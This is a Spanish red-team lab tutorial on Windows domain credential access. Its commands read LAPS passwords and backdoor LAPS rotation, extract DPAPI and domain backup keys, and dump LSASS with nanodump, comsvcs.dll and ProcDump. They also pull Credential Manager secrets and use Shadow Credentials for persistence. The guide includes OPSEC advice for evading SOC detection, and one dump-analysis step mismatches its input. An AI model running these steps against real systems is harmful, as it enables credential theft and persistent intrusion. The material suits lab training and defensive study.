# Tradecraft — Operación SHADOW VAULT
## Lab-07: LAPS, DPAPI, Shadow Credentials y LSASS Alternativo

**Operación:** SHADOW VAULT | **Adversario:** APT28 (Fancy Bear) | **Nivel:** Post-Exploitation  
**Autor:** Adrián Camacho | **Versión:** 1.0 | **Fecha:** Mayo 2026

---

## Índice

1. [LAPS — Local Administrator Password Solution](#1-laps)
2. [DPAPI — Data Protection API](#2-dpapi)
3. [LSASS dump sin Mimikatz](#3-lsass-dump-sin-mimikatz)
4. [Credential Manager — Vault de Windows](#4-credential-manager)
5. [Shadow Credentials (repaso aplicado)](#5-shadow-credentials-aplicado)
6. [OPSEC — Credential access moderno](#6-opsec)

---

## 1. LAPS — Local Administrator Password Solution

### ¿Qué es LAPS?

LAPS es una solución de Microsoft que gestiona automáticamente las contraseñas de la cuenta Administrador local en cada equipo del dominio. Genera contraseñas únicas y aleatorias por equipo, las rota periódicamente y las almacena en AD en el atributo `ms-Mcs-AdmPwd` del objeto computer.

### Por qué LAPS resuelve un problema real

Sin LAPS, la mayoría de organizaciones usan la misma contraseña de administrador local en todos los equipos. Comprometer un equipo da acceso a todos los demás via PTH. Con LAPS, cada equipo tiene una contraseña diferente.

### Cómo funciona

```
DC → GPO → Equipo: "genera nueva contraseña para Administrador local"
Equipo → DC: guarda contraseña en ms-Mcs-AdmPwd del objeto computer
Administrador IT → AD: lee ms-Mcs-AdmPwd para acceder al equipo
```

### Enumeración de LAPS

```powershell
# Desde Windows — verificar si LAPS está instalado
Get-Command Get-AdmPwdPassword -ErrorAction SilentlyContinue

# Qué equipos tienen LAPS configurado
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime |
  Where-Object { $_."ms-Mcs-AdmPwd" -ne $null } |
  Select-Object Name, "ms-Mcs-AdmPwd", "ms-Mcs-AdmPwdExpirationTime"

# Qué usuarios pueden leer ms-Mcs-AdmPwd
Find-AdmPwdExtendedRights -Identity "OU=Workstations,DC=atackcorp,DC=local"
```

```bash
# Desde Kali con NetExec
nxc ldap 10.0.2.10 -u usuario -p password --module laps

# Con LDAPSearch
ldapsearch -H ldap://10.0.2.10 -D "user@atackcorp.local" -w password \
  -b "DC=atackcorp,DC=local" \
  "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime
```

### LAPS Backdoor — Persistencia

Si tenemos acceso de escritura sobre el objeto computer, podemos modificar `ms-Mcs-AdmPwdExpirationTime` para evitar que la contraseña rote, manteniendo acceso indefinido.

```powershell
# Prevenir rotación de contraseña LAPS
Set-ADComputer WKSTN-01 -Replace @{"ms-Mcs-AdmPwdExpirationTime" = "133000000000000000"}
```

### LAPS v2 (Windows LAPS)

Windows Server 2022 / Windows 11 incluye **Windows LAPS** (LAPS v2) nativo, que añade:
- Cifrado de la contraseña almacenada en AD
- Soporte para Azure AD
- Historial de contraseñas

La lectura requiere permisos explícitos y la contraseña está cifrada — más difícil de abusar que LAPS v1.

---

## 2. DPAPI — Data Protection API

### ¿Qué es DPAPI?

DPAPI (Data Protection API) es un sistema de cifrado de Windows que permite a las aplicaciones cifrar datos vinculándolos a la identidad del usuario o la máquina. Navegadores, gestores de contraseñas, credenciales de red y muchas otras aplicaciones usan DPAPI.

### Arquitectura de DPAPI

```
Dato en claro
    ↓ CryptProtectData()
Dato cifrado (DPAPI blob)
    ↓ para descifrar necesitas:
Master Key → derivada de contraseña del usuario + SID
    ↓ Master Keys almacenadas en:
%APPDATA%\Microsoft\Protect\{SID}\{GUID}
```

### Lo que DPAPI protege (y lo que queremos robar)

| Aplicación | Datos protegidos | Ubicación |
|-----------|-----------------|-----------|
| Chrome/Edge | Contraseñas, cookies, tokens | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data` |
| Firefox | Contraseñas | `%APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json` |
| Credential Manager | Credenciales de red, certificados | `%LOCALAPPDATA%\Microsoft\Credentials\` |
| Outlook | Credenciales de email | Registro + DPAPI blobs |
| RDP | Credenciales guardadas | `%LOCALAPPDATA%\Microsoft\Credentials\` |
| WiFi | Contraseñas WiFi | `C:\ProgramData\Microsoft\Wlansvc\Profiles\` |

### Extracción de DPAPI en contexto del usuario (sin admin)

```powershell
# SharpDPAPI — extrae Master Keys del usuario actual
.\SharpDPAPI.exe triage

# Descifrar credenciales de Chrome
.\SharpDPAPI.exe logins

# Credential Manager
.\SharpDPAPI.exe credentials
```

### Extracción de DPAPI con acceso de Admin/SYSTEM

```bash
# Desde Kali con impacket (necesita credenciales de dominio + SYSTEM en la máquina)
# 1. Obtener Master Keys del DC (DPAPI de dominio)
impacket-dpapi masterkey \
  -file /path/to/masterkey \
  -target-user usuario \
  -sid S-1-5-21-... \
  -password password

# 2. Descifrar credential files
impacket-dpapi credential \
  -file /path/to/credential_file \
  -key MASTER_KEY_HEX
```

### DPAPI y el Domain Backup Key

El DC almacena una **clave maestra de backup** (Domain DPAPI Backup Key) que puede descifrar cualquier Master Key del dominio. Esta clave puede obtenerse via DCSync y permite descifrar DPAPI de todos los usuarios del dominio.

```bash
# Obtener Domain DPAPI Backup Key
impacket-dpapi backupkeys --export -t atackcorp.local/Administrador:password@10.0.2.10

# Descifrar cualquier Master Key con la backup key
impacket-dpapi masterkey -file MASTERKEY_FILE -pvk BACKUP_KEY.pvk
```

---

## 3. LSASS dump sin Mimikatz

### Por qué evitar Mimikatz directo

Mimikatz es el binario más detectado del mundo en Red Team. Cualquier AV/EDR moderno lo detecta por firma, comportamiento o nombre. Las alternativas modernas generan menos detección.

### Alternativas a Mimikatz para LSASS

#### nanodump — dump sigiloso de LSASS

```bash
# Desde Kali — subir y ejecutar
upload /opt/redteam/windows/nanodump.exe
.\nanodump.exe --write C:\Windows\Temp\lsass.dmp --fork

# Descargar y analizar en Kali
download C:\Windows\Temp\lsass.dmp
impacket-secretsdump -sam /tmp/sam.bak -security /tmp/security.bak LOCAL
```

#### Task Manager (GUI) o comsvcs.dll (LOLBin)

```powershell
# Sin herramientas externas — usando comsvcs.dll nativo
$process = Get-Process lsass
rundll32 C:\windows\System32\comsvcs.dll, MiniDump $process.Id C:\Temp\lsass.dmp full
```

#### ProcDump (firmado por Microsoft)

```powershell
# ProcDump está firmado por Microsoft — menos detección
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

#### Alternativa sin dump: pypykatz

```bash
# Analizar dump en Kali sin necesidad de Mimikatz en Windows
pypykatz lsa minidump /tmp/lsass.dmp
```

### PPL — Protected Process Light

Windows puede configurar LSASS como PPL (Protected Process Light) que impide que procesos no firmados lean su memoria. En este caso los métodos anteriores fallan.

```powershell
# Verificar si LSASS está como PPL
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RunAsPPL
# RunAsPPL = 1 → LSASS protegido
```

Bypass de PPL requiere driver firmado (PPLdump, PPLKiller) o explotar vulnerabilidades del kernel — técnica avanzada cubierta en Phase-03.

---

## 4. Credential Manager — Vault de Windows

### Tipos de credenciales en Credential Manager

| Tipo | Descripción | Ubicación |
|------|-------------|-----------|
| Windows Credentials | Recursos de red, shares SMB | `%LOCALAPPDATA%\Microsoft\Credentials\` |
| Certificate-Based | Certificados de autenticación | `%LOCALAPPDATA%\Microsoft\Credentials\` |
| Generic Credentials | Aplicaciones (Git, VPN, etc.) | `%LOCALAPPDATA%\Microsoft\Credentials\` |

### Extracción

```powershell
# Listar credenciales guardadas
cmdkey /list

# Con PowerShell
[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]::new().RetrieveAll() | ForEach { $_.RetrievePassword(); $_ }

# Con Seatbelt
.\Seatbelt.exe WindowsVault
```

### Credenciales de tareas programadas

Las tareas programadas que se ejecutan como usuario específico almacenan las credenciales en DPAPI. Si el usuario que ejecuta la tarea tiene privilegios interesantes, extraer esas credenciales puede ser valioso.

```powershell
# Listar tareas con credenciales de usuario
Get-ScheduledTask | Where-Object { $_.Principal.RunLevel -eq "HighestAvailable" -and $_.Principal.UserId -notmatch "SYSTEM|LOCAL" }
```

---

## 5. Shadow Credentials (aplicado)

En este lab Shadow Credentials se aplica específicamente para:

1. **Persistencia post-IR** — si el Blue Team rota contraseñas pero no audita `msDS-KeyCredentialLink`, mantenemos acceso
2. **Movimiento lateral sin ruido** — comprometer cuentas sin generar eventos de cambio de contraseña
3. **Cuentas de servicio** — si tenemos GenericWrite sobre sql_svc o iis_svc, Shadow Credentials da acceso persistente

Ver Lab-05 para la teoría completa de Shadow Credentials.

---

## 6. OPSEC — Credential Access moderno

### El principio del menor ruido

En 2026, los SOCs monitorizan activamente:
- Dumps de LSASS (por comportamiento, no solo firma)
- Acceso a `ms-Mcs-AdmPwd` por cuentas no autorizadas
- Modificación de `msDS-KeyCredentialLink`
- Acceso a archivos DPAPI de otros usuarios

### Orden de preferencia OPSEC para credential access

```
1. DPAPI backup key (requiere DA, pero da acceso a todo sin tocar LSASS)
2. Shadow Credentials (no toca contraseñas, no genera eventos ruidosos)
3. LAPS lectura (si tienes permisos, completamente legítimo)
4. comsvcs.dll dump (LOLBin, firmado por Windows)
5. nanodump/PPLdump (herramientas modernas con evasión)
6. Mimikatz directo (último recurso — alta detección)
```

### Event IDs clave

| Acción | Event ID | Mitigation del atacante |
|--------|----------|------------------------|
| Lectura ms-Mcs-AdmPwd | 4662 | Usar cuenta con permisos legítimos |
| Modificación msDS-KeyCredentialLink | 5136 | Limpiar inmediatamente |
| LSASS access (dump) | 10 (Sysmon) | Usar LOLBins, fork del proceso |
| Acceso a DPAPI credential files | 4663 | Acceder como el propio usuario |

---

## Referencias

- [Microsoft LAPS Documentation](https://docs.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [DPAPI demystified — Passcape](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28)
- [nanodump GitHub](https://github.com/helpsystems/nanodump)
- [SharpDPAPI GitHub](https://github.com/GhostPack/SharpDPAPI)
- [MITRE ATT&CK — APT28](https://attack.mitre.org/groups/G0007/)

---

*Operación SHADOW VAULT — Adrián Camacho | Mayo 2026*  
*Entorno de laboratorio — Únicamente con fines educativos*